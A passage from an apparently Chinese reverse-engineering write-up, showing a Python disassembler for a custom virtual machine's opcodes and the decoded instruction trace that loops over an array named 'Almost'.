class="hljs-number">4</span>)&#125;</span> mod vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">5</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] |= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> or vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">6</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] ^= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> xor vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">7</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] &lt;&lt;= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> shl vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">8</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] &gt;&gt;= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> shr vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(f&#x27;&#123;hex(rip)[2:].zfill(4)&#125; &#x27;)</span><br><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">1</span>:<br>            v14 = (rip &amp; <span class="hljs-number">0xffff0000</span>) &gt;&gt; <span class="hljs-number">32</span><br>            dword = vm_regs[opcode[rip + <span class="hljs-number">3</span>]] - v14<br>            regs_16 += <span class="hljs-number">8</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">8</span>]]), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> cmp vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>,<span class="hljs-subst">&#123;(opcode[rip+<span class="hljs-number">4</span>])&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            v14 = opcode[rip + <span class="hljs-number">4</span>]<br>            dword = vm_regs[opcode[rip + <span class="hljs-number">3</span>]] - opcode[rip + <span class="hljs-number">4</span>]<br>            regs_16 += <span class="hljs-number">5</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">5</span>]]), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> cmp vm_regs<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>,vm_regs<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">4</span>]&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">0xb</span>:<br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># regs_16 += opcode[rip + 3]</span><br>            regs_16 += c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># regs_16 += opcode[rip:rip + 3]</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">4</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jmp <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> dword &gt; <span class="hljs-number">0</span>:<br>                regs_16 += <span class="hljs-number">7</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，je <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                regs_16 += c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip+<span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),base=<span class="hljs-number">16</span>)).value<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + opcode[rip + <span class="hljs-number">3</span>]]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> je <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">if</span> dword &gt; <span class="hljs-number">0</span>:<br>                regs_16 += c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip+<span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),base=<span class="hljs-number">16</span>)).value<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                regs_16 += <span class="hljs-number">7</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> dword &lt;= <span class="hljs-number">0</span>:<br>                regs_16 += <span class="hljs-number">7</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jel <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                regs_16 += opcode[rip + <span class="hljs-number">3</span>]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:opcode[rip + <span class="hljs-number">3</span>]]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">if</span> dword &lt; <span class="hljs-number">0</span>:<br>                regs_16 += <span class="hljs-number">7</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jl <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                regs_16 += opcode[rip + <span class="hljs-number">3</span>]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:opcode[rip + <span class="hljs-number">3</span>]]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jeg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">5</span>:<br>            <span class="hljs-keyword">if</span> dword &gt;= <span class="hljs-number">0</span>:<br>                regs_16 += <span class="hljs-number">7</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jeg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                regs_16 += opcode[rip + <span class="hljs-number">3</span>]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:opcode[rip + <span class="hljs-number">3</span>]]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jl <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">6</span>:<br>            <span class="hljs-keyword">if</span> dword &gt; <span class="hljs-number">0</span>:<br>                regs_16 += <span class="hljs-number">7</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                regs_16 += opcode[rip + <span class="hljs-number">3</span>]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:opcode[rip + <span class="hljs-number">3</span>]]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>，jnl <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(regs_16)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>如下就是实际执行的代码以及对应的汇编操作</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">06010600000000</span> <span class="hljs-number">0000</span> mov vm_regs_6,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">06010300000000</span> <span class="hljs-number">0007</span> mov vm_regs_3,<span class="hljs-number">0</span><br>        <span class="hljs-attribute">0000000f</span> <span class="hljs-number">000</span>e jmp <span class="hljs-number">001</span>d<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">50</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">51</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">52</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">53</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">54</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span class="hljs-attribute">06020000</span> <span class="hljs-number">0031</span> mov vm_regs_0,Almost[<span class="hljs-number">55</span>]<br>            <span class="hljs-attribute">30c0</span> <span class="hljs-number">0035</span><br><span class="hljs-attribute">f6f8010000000000</span> <span class="hljs-number">0037</span> cmp vm_regs_0,<span class="hljs-number">0</span><br>  <span class="hljs-attribute">000002d6ffffff</span> <span class="hljs-number">003</span>f jg <span class="hljs-number">0015</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">0015</span><br>  <span class="hljs-attribute">00010301000000</span> <span class="hljs-number">0016</span> add vm_regs_3,vm_regs_1<br>        <span class="hljs-attribute">06000003</span> <span class="hljs-number">001</span>d mov vm_regs_0,vm_regs_3<br>        <span class="hljs-attribute">06000200</span> <span class="hljs-number">0021</span> mov vm_regs_2,vm_regs_0<br>  <span class="hljs-attribute">06010032000000</span> <span class="hljs-number">0025</span> mov vm_regs_0,<span class="hljs-number">50</span><br>              <span class="hljs-attribute">cc</span> <span class="hljs-number">002</span>c<br>        <span class="hljs-attribute">00000002</span> <span class="hljs-number">002</span>d add vm_regs_0,vm_regs_2<br>        <span 